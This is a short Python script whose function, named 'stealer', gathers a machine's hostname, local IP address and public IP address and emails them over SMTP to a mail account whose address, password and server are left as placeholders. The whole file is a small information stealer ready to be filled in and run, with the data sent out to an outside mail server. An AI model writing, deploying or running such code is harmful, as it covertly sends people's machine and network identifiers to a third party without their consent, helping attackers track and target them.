import socket
import requests
import smtplib

def stealer(email,password,smtp):
    hostname = socket.gethostname()
    localIP = socket.gethostbyname(hostname)
    publicIP = requests.get('http://api.ipify.org/').text

    destMail = email
    subject = 'IP'
    emailText = (f'Host: {hostname}\nLocal IP: {localIP}\nPublic IP: {publicIP}')
    message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, destMail, subject, emailText)
    server = smtplib.SMTP_SSL(smtp)
    server.login(email, password)
    server.auth_plain()
    server.sendmail(email, destMail, message)
    server.quit()

stealer("EMAIL", "PASSWORD","SERVER-SMTP")
